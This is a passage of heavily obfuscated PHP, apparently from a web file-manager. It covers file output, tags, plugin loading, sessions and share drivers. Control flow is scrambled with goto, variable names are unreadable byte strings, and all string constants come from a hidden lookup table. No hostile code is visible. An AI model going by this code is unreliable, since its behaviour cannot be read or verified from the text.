return $this->model->fileNameAuto($eëñÊ£ô•, $EÃÀ÷Ñà, $D¾¼´¨“á‰, $fÃ‘¾¬ø); } public function fileNameExist($A±…½Çêš­, $Eù ›Ë) { return $this->model->fileNameExist($A±…½Çêš­, $Eù ›Ë); } protected function _fileOut($dÔè¿ƒ¿Õï, $F•±øùØ£å = false, $B©œ¼ƒ Ó” = false, $c‘‘»„ÎÈ– = '', $fîŞï²•Ü“ = false) { goto Eä÷¢èÀ‚ò; Eä÷¢èÀ‚ò: $D¬‘ÆÕ•¸à =& $_SERVER[òÀöí]; $BÇ’÷¦‰Æ = $this->model->sourceInfo($dÔè¿ƒ¿Õï); if ($BÇ’÷¦‰Æ[$D¬‘ÆÕ•¸à[388]] == $D¬‘ÆÕ•¸à[86]) { header($D¬‘ÆÕ•¸à[1184]); die; } goto Eï»Åéï¥Æ; F†³Ó´êåÄ: if ($fîŞï²•Ü“) { return IO::fileOutServer($Bº§Šê«¯ˆ[$D¬‘ÆÕ•¸à[75]], $F•±øùØ£å, $aÇê©×­, $c‘‘»„ÎÈ–); } IO::fileOut($Bº§Šê«¯ˆ[$D¬‘ÆÕ•¸à[75]], $F•±øùØ£å, $aÇê©×­, $c‘‘»„ÎÈ–); goto D‚»ØäË×ã; Eï»Åéï¥Æ: $Bº§Šê«¯ˆ = $this->model->fileInfoGet($dÔè¿ƒ¿Õï); $c‘‘»„ÎÈ– = $Bº§Šê«¯ˆ[$D¬‘ÆÕ•¸à[169]] ? $Bº§Šê«¯ˆ[$D¬‘ÆÕ•¸à[169]] : $c‘‘»„ÎÈ–; $aÇê©×­ = isset($GLOBALS[$D¬‘ÆÕ•¸à[1185]]) ? $GLOBALS[$D¬‘ÆÕ•¸à[1185]] : $BÇ’÷¦‰Æ[$D¬‘ÆÕ•¸à[28]]; goto F†³Ó´êåÄ; D‚»ØäË×ã: } public function fileOut($C…òÛ³İÍƒ, $c‡ÀùËĞ½Ó = false, $eäÍÚÓÕ¢Ê = false, $Cåà²”†àÆ = '') { $this->_fileOut($C…òÛ³İÍƒ, $c‡ÀùËĞ½Ó, $eäÍÚÓÕ¢Ê, $Cåà²”†àÆ); } public function fileOutServer($aİÃ‚×¨ß, $eæ©™¯åª = false, $Fó±­÷‡Ë÷ = false, $c¯Ó•ÈîÒæ = '') { $this->_fileOut($aİÃ‚×¨ß, $eæ©™¯åª, $Fó±­÷‡Ë÷, $c¯Ó•ÈîÒæ, !0); } protected function _fileOutImage($CêŠÚˆ‹˜ˆ, $fèñ¤ÁÑ¯‚ = 250) { goto dœå¾½éë£; BœçåÜ¿“: $e„«¡âä‘ = $this->model->fileInfoGet($CêŠÚˆ‹˜ˆ); $e„«¡âä‘[$D¾æõªÕñÊ[28]] = $Dñ…Ãù§Á°[$D¾æõªÕñÊ[28]]; $e„«¡âä‘[$D¾æõªÕñÊ[162]] = $Dñ…Ãù§Á°[$D¾æõªÕñÊ[162]]; goto a…„ìÚâ«; dœå¾½éë£: $D¾æõªÕñÊ =& $_SERVER[òÀöí]; $Dñ…Ãù§Á° = $this->model->pathInfo($CêŠÚˆ‹˜ˆ); if ($Dñ…Ãù§Á°[$D¾æõªÕñÊ[388]] == $D¾æõªÕñÊ[86]) { show_json($D¾æõªÕñÊ[1186] . $CêŠÚˆ‹˜ˆ, !1); } goto BœçåÜ¿“; a…„ìÚâ«: $GLOBALS[$D¾æõªÕñÊ[1185]] = $e„«¡âä‘[$D¾æõªÕñÊ[28]]; $GLOBALS[$D¾æõªÕñÊ[161]] = $e„«¡âä‘; IO::fileOutImage($e„«¡âä‘[$D¾æõªÕñÊ[75]], $fèñ¤ÁÑ¯‚); goto CÂ¼íÍ¹í×; CÂ¼íÍ¹í×: } public function fileOutImage($FË‹’‹ĞÄ, $b…óÊè¾ù = 250) { $this->_fileOutImage($FË‹’‹ĞÄ, $b…óÊè¾ù); } public function fileOutImageServer($a–·­®¿Åë, $BÒÆØ§¸°‚ = 250) { $this->_fileOutImage($a–·­®¿Åë, $BÒÆØ§¸°‚); } public function link($E‹ë®Û, $b²ó—óñò‹ = '') { $dİÆ¨ÎÓå¾ = $this->model->fileInfoGet($E‹ë®Û); return IO::link($dİÆ¨ÎÓå¾[$_SERVER[òÀöí][75]], $b²ó—óñò‹); } protected function parse($FéÔ“æè‡Š) { $fÕ¡§Îé˜› =& $_SERVER[òÀöí]; if (strstr($FéÔ“æè‡Š, $fÕ¡§Îé˜›[8]) === !1) { return array($fÕ¡§Îé˜›[403] => intval($FéÔ“æè‡Š), $fÕ¡§Îé˜›[75] => $fÕ¡§Îé˜›[33], $fÕ¡§Îé˜›[1182] => array()); } $F¹©ôÆ•Ä† = explode($fÕ¡§Îé˜›[8], trim($FéÔ“æè‡Š, $fÕ¡§Îé˜›[8])); if (count($F¹©ôÆ•Ä†) < 2) { show_tips($FéÔ“æè‡Š . $fÕ¡§Îé˜›[1187]); } return array($fÕ¡§Îé˜›[403] => intval($F¹©ôÆ•Ä†[0]), $fÕ¡§Îé˜›[75] => $F¹©ôÆ•Ä†[1], $fÕ¡§Îé˜›[1182] => array_slice($F¹©ôÆ•Ä†, 1)); } } goto AÌéº¾ÁòÁ; bœê‡¨ğÈÇ: class GroupTagModel extends ModelBase { protected $tableName = "\165\x73\145\162\137\146\141\x76"; protected function cacheFunctionAlias($Fôˆ×Š³Œˆ) { $aƒºÒÀ‘¸ =& $_SERVER[òÀöí]; return array($aƒºÒÀ‘¸[1761] => array($Fôˆ×Š³Œˆ[0], $aƒºÒÀ‘¸[1762]), $aƒºÒÀ‘¸[1763] => array($Fôˆ×Š³Œˆ[0], $aƒºÒÀ‘¸[1764])); } protected function get($B˜ÃğØÉŠå) { $aŒºÔÌÃ¦ =& $_SERVER[òÀöí]; $BÑçğ°–•½ = Model($aŒºÔÌÃ¦[476])->metaGet($B˜ÃğØÉŠå, $aŒºÔÌÃ¦[1765]); $FÍ‚‰İõ£¼ = json_decode($BÑçğ°–•½, !0); return $FÍ‚‰İõ£¼ ? $FÍ‚‰İõ£¼ : array($aŒºÔÌÃ¦[1766] => $aŒºÔÌÃ¦[86], $aŒºÔÌÃ¦[363] => array()); } protected function set($fß§‡×†àÁ, $E¨ë¢ä¢ˆ«) { $dãª­ÉõÎ =& $_SERVER[òÀöí]; $E¨ë¢ä¢ˆ« = $E¨ë¢ä¢ˆ« ? $E¨ë¢ä¢ˆ« : array($dãª­ÉõÎ[1766] => $dãª­ÉõÎ[86], $dãª­ÉõÎ[363] => array()); Model($dãª­ÉõÎ[476])->metaSet($fß§‡×†àÁ, $dãª­ÉõÎ[1765], json_encode($E¨ë¢ä¢ˆ«)); return Model($dãª­ÉõÎ[476])->metaSet($fß§‡×†àÁ, $dãª­ÉõÎ[1765], json_encode($E¨ë¢ä¢ˆ«)); } protected function getByTagID($Dêçœ¹£¥Ö, $bÃ£÷çÈç) { goto F¿¹‰Øæ; DêßÍ“ºÔ‡: return is_array($CÈªŒ® ¶É) ? $CÈªŒ® ¶É : !1; goto CÓ”‡Œ‚à…; e‹ñ÷êóâ: $Bç„¿ù±Áš = $this->get($Dêçœ¹£¥Ö); if (!$Bç„¿ù±Áš || !isset($Bç„¿ù±Áš[$d—‘Úù¾òÚ[363]])) { return !1; } $CÈªŒ® ¶É = array_find_by_field($Bç„¿ù±Áš[$d—‘Úù¾òÚ[363]], $d—‘Úù¾òÚ[385], $bÃ£÷çÈç); goto DêßÍ“ºÔ‡; F¿¹‰Øæ: $d—‘Úù¾òÚ =& $_SERVER[òÀöí]; if (!$Dêçœ¹£¥Ö || !$bÃ£÷çÈç) { return !1; } if (!Model($d—‘Úù¾òÚ[476])->getInfoSimple($Dêçœ¹£¥Ö)) { return !1; } goto e‹ñ÷êóâ; CÓ”‡Œ‚à…: } public function listSource($c«ÏÏ¬ÎÅ, $d£Œ¹µË˜) { goto e„˜ŸÏ÷Ë˜; D‹õæ¯¦…ø: $FæˆÎ£òÈ¨ = array(); foreach ($eïæµ°Îª as $FŸ»¹…Ó¶Â) { $Cî¢Ì•»Å‘ = $FŸ»¹…Ó¶Â[$e—£ÊØ˜[75]]; if (!$Cî¢Ì•»Å‘) { continue; } if (!isset($FæˆÎ£òÈ¨[$Cî¢Ì•»Å‘])) { $FæˆÎ£òÈ¨[$Cî¢Ì•»Å‘] = array(); } $FæˆÎ£òÈ¨[$Cî¢Ì•»Å‘][] = $FŸ»¹…Ó¶Â[$e—£ÊØ˜[410]]; } $bÄŠ¯Â½ï” = array(); goto aŞçñ»µé¯; e¸í¢×ë½: if ($AÑ²æ©«Üõ) { $this->removeBySource($c«ÏÏ¬ÎÅ, $AÑ²æ©«Üõ); } return $dæˆÊø´èÉ; goto DÆì­ÀñÕ»; aƒ—âîõ¹: if (!$dæˆÊø´èÉ || count($bÄŠ¯Â½ï”) == $dæˆÊø´èÉ[$e—£ÊØ˜[360]][$e—£ÊØ˜[361]]) { return $dæˆÊø´èÉ; } $AÑ²æ©«Üõ = array(); $EÜÕï°õïÖ = array_to_keyvalue($dæˆÊø´èÉ[$e—£ÊØ˜[74]], $e—£ÊØ˜[33], $e—£ÊØ˜[387]); goto bòˆÀ›†Õ¡; bòˆÀ›†Õ¡: $CÔä«Ş»†Ç = array_to_keyvalue($dæˆÊø´èÉ[$e—£ÊØ˜[73]], $e—£ÊØ˜[33], $e—£ÊØ˜[387]); $B·Ó—Å¸¤ = array_merge($CÔä«Ş»†Ç, $EÜÕï°õïÖ); foreach ($bÄŠ¯Â½ï” as $Cî¢Ì•»Å‘) { if (!in_array($Cî¢Ì•»Å‘, $B·Ó—Å¸¤)) { $AÑ²æ©«Üõ[] = $Cî¢Ì•»Å‘; } } goto e¸í¢×ë½; e„˜ŸÏ÷Ë˜: $e—£ÊØ˜ =& $_SERVER[òÀöí]; if ($d£Œ¹µË˜ && !is_array($d£Œ¹µË˜)) { $d£Œ¹µË˜ = array($d£Œ¹µË˜); } $eïæµ°Îª = $this->listData($c«ÏÏ¬ÎÅ); goto D‹õæ¯¦…ø; aŞçñ»µé¯: foreach ($FæˆÎ£òÈ¨ as $Aô§ÎÒ„êÚ => $EÖã¦Ä°´Ç) { $bÓ±ĞæİÌö = !0; if (!$d£Œ¹µË˜) { $bÄŠ¯Â½ï”[] = $Aô§ÎÒ„êÚ; continue; } foreach ($d£Œ¹µË˜ as $dÜ®ƒÏ•”è) { if (!in_array($dÜ®ƒÏ•”è, $EÖã¦Ä°´Ç)) { $bÓ±ĞæİÌö = !1; break; } } if ($bÓ±ĞæİÌö) { $bÄŠ¯Â½ï”[] = $Aô§ÎÒ„êÚ; } } if (!$bÄŠ¯Â½ï”) { return array(); } $dæˆÊø´èÉ = Model($e—£ÊØ˜[1181])->listSource(array($e—£ÊØ˜[401] => array($e—£ÊØ˜[402], $bÄŠ¯Â½ï”))); goto aƒ—âîõ¹; DÆì­ÀñÕ»: } protected function listData($eÄßˆ‰±œÙ) { $A¹Ô„«ÚÉ =& $_SERVER[òÀöí]; $d…¬è»…¤Á = array($A¹Ô„«ÚÉ[1496] => 0, $A¹Ô„«ÚÉ[452] => array($A¹Ô„«ÚÉ[1767], 0), $A¹Ô„«ÚÉ[406] => $A¹Ô„«ÚÉ[1768] . $eÄßˆ‰±œÙ); $b‡„¤Ó°Ÿ¨ = $A¹Ô„«ÚÉ[1769]; $AÎ„Ã¸‚Æ› = $this->field($b‡„¤Ó°Ÿ¨)->where($d…¬è»…¤Á)->order($A¹Ô„«ÚÉ[1770])->select(); return $AÎ„Ã¸‚Æ› ? $AÎ„Ã¸‚Æ› : array(); } protected function addToTag($F°­ïéË–µ, $e¨¥¾óÇ…, $B ôäÅ¯—è) { $Bö‡íëÏç¤ =& $_SERVER[òÀöí]; if (!$this->getByTagID($F°­ïéË–µ, $B ôäÅ¯—è) || !$e¨¥¾óÇ…) { return !1; } if (!Model($Bö‡íëÏç¤[778])->pathInfo($e¨¥¾óÇ…)) { return !1; } $CÁºœÃ¬‚ = array($Bö‡íëÏç¤[1496] => 0, $Bö‡íëÏç¤[452] => $B ôäÅ¯—è, $Bö‡íëÏç¤[405] => $e¨¥¾óÇ…, $Bö‡íëÏç¤[406] => $Bö‡íëÏç¤[1771] . $F°­ïéË–µ, $Bö‡íëÏç¤[404] => $Bö‡íëÏç¤[33], $Bö‡íëÏç¤[1667] => 0); if ($this->where($CÁºœÃ¬‚)->find()) { return !1; } return $this->add($CÁºœÃ¬‚); } protected function removeFromTag($DÕ“‚Œè, $f‚ÁÎĞ‡µ, $A‹¢å³ƒÍ­) { $Bğö°”ÚÕË =& $_SERVER[òÀöí]; if (!$this->getByTagID($DÕ“‚Œè, $A‹¢å³ƒÍ­) || !$f‚ÁÎĞ‡µ) { return !1; } if (is_array($f‚ÁÎĞ‡µ)) { $f‚ÁÎĞ‡µ = array($Bğö°”ÚÕË[7], $f‚ÁÎĞ‡µ); } $dÜô¤òÂ‘À = array($Bğö°”ÚÕË[1496] => 0, $Bğö°”ÚÕË[452] => $A‹¢å³ƒÍ­, $Bğö°”ÚÕË[406] => $Bğö°”ÚÕË[1771] . $DÕ“‚Œè, $Bğö°”ÚÕË[405] => $f‚ÁÎĞ‡µ); return $this->where($dÜô¤òÂ‘À)->delete(); } protected function removeByTag($fË˜Š‹ÎÇŠ, $eŸí«˜¬¸¡) { $Bó’¢öÛõ =& $_SERVER[òÀöí]; if (!$this->getByTagID($fË˜Š‹ÎÇŠ, $eŸí«˜¬¸¡)) { return !1; } $CÈ¨¢‰ùèç = array($Bó’¢öÛõ[1496] => 0, $Bó’¢öÛõ[452] => $eŸí«˜¬¸¡, $Bó’¢öÛõ[406] => $Bó’¢öÛõ[1771] . $fË˜Š‹ÎÇŠ); return $this->where($CÈ¨¢‰ùèç)->delete(); } protected function removeBySource($a±ÊŞ¡„ŒË, $a‡â²é¶ƒø) { $dÀì—ÏëÆ =& $_SERVER[òÀöí]; if (!$a±ÊŞ¡„ŒË || !$a‡â²é¶ƒø) { return !1; } if (is_array($a‡â²é¶ƒø)) { $a‡â²é¶ƒø = array($dÀì—ÏëÆ[7], $a‡â²é¶ƒø); } $aĞŒÈÈ…İâ = array($dÀì—ÏëÆ[1496] => 0, $dÀì—ÏëÆ[405] => $a‡â²é¶ƒø, $dÀì—ÏëÆ[452] => array($dÀì—ÏëÆ[950], 0), $dÀì—ÏëÆ[406] => $dÀì—ÏëÆ[1771] . $a±ÊŞ¡„ŒË); return $this->where($aĞŒÈÈ…İâ)->delete(); } } class PluginModel extends ModelBaseLight { public $optionType = "\123\x79\163\164\x65\155\x2e\x70\154\x75\x67\x69\156\x4c\151\x73\164"; public $field = array("\156\141\155\145", "\x73\x74\x61\164\x75\163", "\162\145\x67\151\x65\x73\164", "\143\157\156\x66\151\147"); public function loadList($Aëô¾Ÿ„Ø = false) { $FÇÅ‡ğ”¹Ş = array_to_keyvalue($this->listData(), $_SERVER[òÀöí][28]); if ($Aëô¾Ÿ„Ø) { return $FÇÅ‡ğ”¹Ş[$Aëô¾Ÿ„Ø]; } return $FÇÅ‡ğ”¹Ş; } public function init() { $Eª°Á¯ŠâÕ =& $_SERVER[òÀöí]; Hook::trigger($Eª°Á¯ŠâÕ[1772]); $eêôÌ‘„Í = $this->loadPluginList(); foreach ($eêôÌ‘„Í as $bÈÆ·ÈñÈí => $C‹¹½ˆÔµ¿) { $A¥àŒŞ©µ‰ = $this->appAllow($bÈÆ·ÈñÈí, $C‹¹½ˆÔµ¿); if (!$A¥àŒŞ©µ‰) { continue; } foreach ($C‹¹½ˆÔµ¿[$Eª°Á¯ŠâÕ[1773]] as $Eñº³¶ò®Ï => $BŒØ¨ÁÈõø) { Hook::bind($Eñº³¶ò®Ï, $BŒØ¨ÁÈõø); } } Hook::trigger($Eª°Á¯ŠâÕ[1774]); Hook::trigger(ACTION); } public function appAllow($Fğõ¯œƒ”, $bÎÂÃ‡À“, $F–Õè¢éä¤ = true) { $Aâô…§ŞÃÎ =& $_SERVER[òÀöí]; $Eç² ùÛ§ä = PLUGIN_DIR . $Fğõ¯œƒ” . $Aâô…§ŞÃÎ[1775]; if (!is_array($bÎÂÃ‡À“) || !is_array($bÎÂÃ‡À“[$Aâô…§ŞÃÎ[1773]]) || $bÎÂÃ‡À“[$Aâô…§ŞÃÎ[708]] != 1 || !is_file($Eç² ùÛ§ä)) { return !1; } if ($GLOBALS[$Aâô…§ŞÃÎ[475]] == 1) { return !0; } if ($F–Õè¢éä¤ && !Action($Aâô…§ŞÃÎ[1776])->checkAuth($Fğõ¯œƒ”)) { return !1; } return !0; } public function unInstall($aàÌñ‘âÛ) { $FÎ·Ñ«²‘ =& $_SERVER[òÀöí]; $e©–èÉ±òÊ = $this->loadList($aàÌñ‘âÛ); if (file_exists(PLUGIN_DIR . $aàÌñ‘âÛ)) { Hook::apply($aàÌñ‘âÛ . $FÎ·Ñ«²‘[1777]); } $this->remove($e©–èÉ±òÊ[$FÎ·Ñ«²‘[385]]); } public function changeStatus($c¼ÖÚŸ—Í, $C¸ÉÎßÒ´Ÿ) { $C›¼ŸºÅôÒ =& $_SERVER[òÀöí]; $DçëŒóœÑ„ = $this->loadList($c¼ÖÚŸ—Í); if ($C¸ÉÎßÒ´Ÿ) { Hook::apply($c¼ÖÚŸ—Í . $C›¼ŸºÅôÒ[1778]); } $this->update($DçëŒóœÑ„[$C›¼ŸºÅôÒ[385]], array($C›¼ŸºÅôÒ[1779] => $C¸ÉÎßÒ´Ÿ)); } public function appRegist($bêè·¾Î, $cšŒ£¡ÊÄ•) { $B·î¨ğ‰Áã =& $_SERVER[òÀöí]; $EÑè¶°ÉÌÛ = $this->loadList($bêè·¾Î); if ($EÑè¶°ÉÌÛ) { $this->update($EÑè¶°ÉÌÛ[$B·î¨ğ‰Áã[385]], array($B·î¨ğ‰Áã[1773] => $cšŒ£¡ÊÄ•)); } else { $d‹ÜÓŠ¢îª = array($B·î¨ğ‰Áã[28] => $bêè·¾Î, $B·î¨ğ‰Áã[1773] => $cšŒ£¡ÊÄ•, $B·î¨ğ‰Áã[708] => 0, $B·î¨ğ‰Áã[6] => $this->getConfigDefault($bêè·¾Î)); $this->insert($d‹ÜÓŠ¢îª); } } public function getConfigDefault($fˆŠÅ„Ê²Â) { $bõ•Õá›é =& $_SERVER[òÀöí]; $FŒ÷ó ¢ì = array(); $Aƒñ¬Ú†À = $this->getPackageJson($fˆŠÅ„Ê²Â); if (!$Aƒñ¬Ú†À && is_array($Aƒñ¬Ú†À[$bõ•Õá›é[1780]])) { return $FŒ÷ó ¢ì; } foreach ($Aƒñ¬Ú†À[$bõ•Õá›é[1780]] as $c‹»‹‚ÇÊÌ => $cÃÎèØç„) { if (!isset($cÃÎèØç„[$bõ•Õá›é[368]]) || isset($FŒ÷ó ¢ì[$c‹»‹‚ÇÊÌ])) { continue; } $FŒ÷ó ¢ì[$c‹»‹‚ÇÊÌ] = $cÃÎèØç„[$bõ•Õá›é[368]]; } return $FŒ÷ó ¢ì; } public function getPackageJson($a½ÏëÒ¢¨ì) { return Hook::apply($a½ÏëÒ¢¨ì . $_SERVER[òÀöí][1781]); } public function getConfig($a©…¦¼Û•š, $DÖÍ¥´†¯ˆ = false) { $EÂÇÏ™¸¿° =& $_SERVER[òÀöí]; $CÂÏÍ¸›İÏ = array(); $DÖ’ù²“ø» = $this->loadList($a©…¦¼Û•š); if ($DÖ’ù²“ø» && is_array($DÖ’ù²“ø»[$EÂÇÏ™¸¿°[6]])) { $CÂÏÍ¸›İÏ = $DÖ’ù²“ø»[$EÂÇÏ™¸¿°[6]]; } if (!$CÂÏÍ¸›İÏ || $DÖÍ¥´†¯ˆ) { $CÂÏÍ¸›İÏ = $this->getConfigDefault($a©…¦¼Û•š); } return $CÂÏÍ¸›İÏ; } public function setConfig($C¯†Ç±½±ß, $EÔ°ğçÎù„ = false) { goto eÃ©¢‰·Ş; cßæÚ‰‰Ò˜: $this->update($cá¥ùë×èù[$f¶¸´Š˜…[385]], array($f¶¸´Š˜…[6] => $f‰İ‡ÂØ™ñ)); goto C¡ìÁÅÎÒ; eÃ©¢‰·Ş: $f¶¸´Š˜… =& $_SERVER[òÀöí]; $cá¥ùë×èù = $this->loadList($C¯†Ç±½±ß); if (!$cá¥ùë×èù) { return !1; } goto aÔÔŠÇÊ Î; aÔÔŠÇÊ Î: $f‰İ‡ÂØ™ñ = $cá¥ùë×èù[$f¶¸´Š˜…[6]]; if ($EÔ°ğçÎù„ == !1) { $f‰İ‡ÂØ™ñ = array(); $EÔ°ğçÎù„ = $this->getConfigDefault($C¯†Ç±½±ß); } foreach ($EÔ°ğçÎù„ as $fíçÃ´æ§µ => $f¸îå÷’ÓÓ) { $f‰İ‡ÂØ™ñ[$fíçÃ´æ§µ] = is_string($f¸îå÷’ÓÓ) ? trim($f¸îå÷’ÓÓ) : $f¸îå÷’ÓÓ; } goto cßæÚ‰‰Ò˜; C¡ìÁÅÎÒ: } public function viewList() { goto B°Õ «À·Ü; e‡†Ö‹§š: $d‘•Ó±œì = $this->loadPluginList(); $Fİ‰ÖëŸíó = array(); foreach ($d‘•Ó±œì as $d„›’İ”’† => $Dšêğé‰å) { unset($Dšêğé‰å[$E‹‹Ü»Íéœ[1773]], $Dšêğé‰å[$E‹‹Ü»Íéœ[6]]); $C¶°„•‰æ = PLUGIN_DIR . $Dšêğé‰å[$E‹‹Ü»Íéœ[28]] . $E‹‹Ü»Íéœ[1775]; if (!is_file($C¶°„•‰æ)) { continue; } $eéóíª÷å = Hook::apply($Dšêğé‰å[$E‹‹Ü»Íéœ[28]] . $E‹‹Ü»Íéœ[1781]); if (is_array($eéóíª÷å)) { $Fİ‰ÖëŸíó[$d„›’İ”’†] = array_merge($Dšêğé‰å, $eéóíª÷å); } } goto bİ¨í÷¯‹¼; B°Õ «À·Ü: $E‹‹Ü»Íéœ =& $_SERVER[òÀöí]; $d‘•Ó±œì = $this->loadList(); $this->pluginScan($d‘•Ó±œì); goto e‡†Ö‹§š; bİ¨í÷¯‹¼: return $Fİ‰ÖëŸíó; goto E…§Åì‰ÒÒ; E…§Åì‰ÒÒ: } private function loadPluginList() { $Cª‹Ş•Ñ† =& $_SERVER[òÀöí]; $AÄ÷‹öç¤ = $this->loadList(); if (strtolower(MOD) == $Cª‹Ş•Ñ†[1782]) { return $AÄ÷‹öç¤; } $a¡¸ç´ØÜ = Hook::trigger($Cª‹Ş•Ñ†[1783], $AÄ÷‹öç¤); if ($AÄ÷‹öç¤ && !$a¡¸ç´ØÜ) { die; } return $a¡¸ç´ØÜ ? $a¡¸ç´ØÜ : $AÄ÷‹öç¤; } private function pluginScan($bÍ˜Í‚«¿) { $e•ô®†ÎŒË =& $_SERVER[òÀöí]; recursion_dir(PLUGIN_DIR, $B £’ÇàÆ, $c’Ì¹šš¡Ê, 0); foreach ($B £’ÇàÆ as $a÷À¶‰ÉÔ™) { $a•×ê³çµ = get_path_this($a÷À¶‰ÉÔ™); if (isset($bÍ˜Í‚«¿[$a•×ê³çµ]) || !file_exists($a÷À¶‰ÉÔ™ . $e•ô®†ÎŒË[1784]) || !file_exists($a÷À¶‰ÉÔ™ . $e•ô®†ÎŒË[1775])) { continue; } Hook::apply($a•×ê³çµ . $e•ô®†ÎŒË[1778]); } } } class SessionModel extends ModelBase { protected $tableName = "\163\171\x73\x74\145\155\137\163\x65\x73\163\151\x6f\156"; public function get($B«µŠÑÉ¹) { $A °šªŞí‰ =& $_SERVER[òÀöí]; $aÚ”‰Ä¿ = $this->where(array($A °šªŞí‰[1785] => $B«µŠÑÉ¹))->find(); if (!is_array($aÚ”‰Ä¿)) { return !1; } return $aÚ”‰Ä¿[$A °šªŞí‰[711]]; } public function set($BÉ‘Ô ²àõ, $C¨ª…Á¤‚Ú, $BçÎ•èôÈ‘ = 3600) { $dì¡ÃËøõ¼ =& $_SERVER[òÀöí]; $bïİÜ©¹… = array($dì¡ÃËøõ¼[1785] => $BÉ‘Ô ²àõ, $dì¡ÃËøõ¼[1697] => $C¨ª…Á¤‚Ú, $dì¡ÃËøõ¼[1786] => $BçÎ•èôÈ‘ + time()); if (Session::get($dì¡ÃËøõ¼[1787])) { $bïİÜ©¹…[$dì¡ÃËøõ¼[1504]] = Session::get($dì¡ÃËøõ¼[1787]); } else { $bïİÜ©¹…[$dì¡ÃËøõ¼[1504]] = 0; } if ($this->get($BÉ‘Ô ²àõ)) { return $this->where(array($dì¡ÃËøõ¼[1785] => $BÉ‘Ô ²àõ))->save($bïİÜ©¹…); } else { return $this->add($bïİÜ©¹…, array(), !0); } } public function remove($DÇ‡ˆö®ì‚) { return $this->where(array($_SERVER[òÀöí][1785] => $DÇ‡ˆö®ì‚))->delete(); } public function clearTimeout() { return $this->where($_SERVER[òÀöí][1788] . time())->delete(); } } goto D™¨Ö­…èŠ; AÌéº¾ÁòÁ: class PathDriverDbShareItem extends PathDriverDB { public function __construct($aª×’Í„¶›) { $this->pathParse = $aª×’Í„¶›; $this->model = Model($_SERVER[òÀöí][1181]); } public function getPathOuter($Eô‰…¿Ú…¤) { $aÁ–Öãƒ =& $_SERVER[òÀöí]; if (!$Eô‰…¿Ú…¤) { return $Eô‰…¿Ú…¤; } $b¨Ç™Í“ = $this->parse($Eô‰…¿Ú…¤); return trim(KodIO::makeShare($this->pathParse[$aÁ–Öãƒ[385]], $b¨Ç™Í“[$aÁ–Öãƒ[385]]), $aÁ–Öãƒ[8]); } protected function infoParse($bÆ‰µ›ÓåÌ, $F£¸î×¡œ± = false, $B÷ƒùÁ¦ºœ = false) { $bÛíÌïç·‘ =& $_SERVER[òÀöí]; $FÚõ¨Ò¤ªÂ = $this->pathParse[$bÛíÌïç·‘[385]]; $Aª´ÜÁÑ˜ = trim($this->pathParse[$bÛíÌïç·‘[1042]], $bÛíÌïç·‘[8]); return Action($bÛíÌïç·‘[1188])->sharePathInfo($FÚõ¨Ò¤ªÂ, $Aª´ÜÁÑ˜); } public function infoFull($Aö¾¹Œê¦ì) { $eé»„¹ğŞÛ =& $_SERVER[òÀöí]; $e¤’°Â®ƒ› = explode($eé»„¹ğŞÛ[8], trim($Aö¾¹Œê¦ì, $eé»„¹ğŞÛ[8])); if (count($e¤’°Â®ƒ›) > 1) { $bÀÎ³’ˆáã = implode($eé»„¹ğŞÛ[8], array_splice($e¤’°Â®ƒ›, 1)); $c¨„Ñ¬˜ÔÔ = $this->model->pathInfoByPath($e¤’°Â®ƒ›[0], $bÀÎ³’ˆáã); if (!$c¨„Ñ¬˜ÔÔ) { return !1; } $this->pathParse[$eé»„¹ğŞÛ[1042]] = $c¨„Ñ¬˜ÔÔ[$eé»„¹ğŞÛ[387]]; } return $this->infoParse($Aö¾¹Œê¦ì); } public function listAll($cÂÔíÅ‰·†) { goto AÅ¥ìÇÂé–; AÅ¥ìÇÂé–: $dÒ¿‰™•µ· =& $_SERVER[òÀöí]; $Cª´ˆ²±™ = IO::info($this->pathParse[$dÒ¿‰™•µ·[75]]); if (!$Cª´ˆ²±™) { return array(); } goto aÙ™¢ò¯ñÊ; aÙ™¢ò¯ñÊ: $AˆÀÇçÎ = $this->model->listAll($cÂÔíÅ‰·†); $C¨¨‡£ë„Û = Model($dÒ¿‰™•µ·[552])->getInfo($Cª´ˆ²±™[$dÒ¿‰™•µ·[457]]); $e’ÎìˆŸ®ë = Action($dÒ¿‰™•µ·[1188]); goto f…÷÷İß’; f…÷÷İß’: foreach ($AˆÀÇçÎ as &$D‚ÀÔ’ºÓ­) { check_abort(); $D‚ÀÔ’ºÓ­[$dÒ¿‰™•µ·[84]] = $e’ÎìˆŸ®ë->_shareItemeParse($D‚ÀÔ’ºÓ­[$dÒ¿‰™•µ·[84]], $C¨¨‡£ë„Û); } unset($D‚ÀÔ’ºÓ­); return $AˆÀÇçÎ; goto bÉÄ‰“…³›; bÉÄ‰“…³›: } } class PathDriverDbShareLink extends PathDriverDB { public function __construct($FœØÉçæñ¡) { $this->pathParse = $FœØÉçæñ¡; $this->model = Model($_SERVER[òÀöí][1181]); } protected function infoParse($eÎëÀöÀª’, $e«Œ®æªÍø = false, $aµ†©„§ = false) { $F²òöŠˆğÅ =& $_SERVER[òÀöí]; return Action($F²òöŠˆğÅ[1048])->sharePathInfo($this->pathParse[$F²òöŠˆğÅ[75]], !0); } public function listPath($dø½ä¸ÅÖç, $céñàõ„ ¡ = false) { $eİº¿ê÷ÔŒ =& $_SERVER[òÀöí]; $bÑÕĞ”’Şƒ = parent::listPath($dø½ä¸ÅÖç, $céñàõ„ ¡); foreach ($bÑÕĞ”’Şƒ as $fäîÁ…Ö§® => $AÇ¶Ô„½Æ–) { if (!in_array($fäîÁ…Ö§®, array($eİº¿ê÷ÔŒ[73], $eİº¿ê÷ÔŒ[74]))) { continue; } foreach ($AÇ¶Ô„½Æ– as $c“—ÜË– => $díÑÇ…õ ) { $bÑÕĞ”’Şƒ[$fäîÁ…Ö§®][$c“—ÜË–] = Action($eİº¿ê÷ÔŒ[1048])->shareItemInfo($díÑÇ…õ ); } } return $bÑÕĞ”’Şƒ; } public function listAll($cŸ“²¿‡çÕ) { goto B¸ƒÉğ; eô›³“ƒŸ: return $AÃŠà¤˜äÏ; goto AµƒèÛÑÑ¹; B¸ƒÉğ: $E”öóÂ†Òù =& $_SERVER[òÀöí]; $CˆœñÇóä = IO::info($this->pathParse[$E”öóÂ†Òù[75]]); if (!$CˆœñÇóä) { return array(); } goto E†â³šïõ; E†â³šïõ: $AÃŠà¤˜äÏ = $this->model->listAll($cŸ“²¿‡çÕ); foreach ($AÃŠà¤˜äÏ as &$eâñˆ‹™äÜ) { $eâñˆ‹™äÜ[$E”öóÂ†Òù[84]] = Action($E”öóÂ†Òù[1048])->shareItemInfo($eâñˆ‹™äÜ[$E”öóÂ†Òù[84]]); } 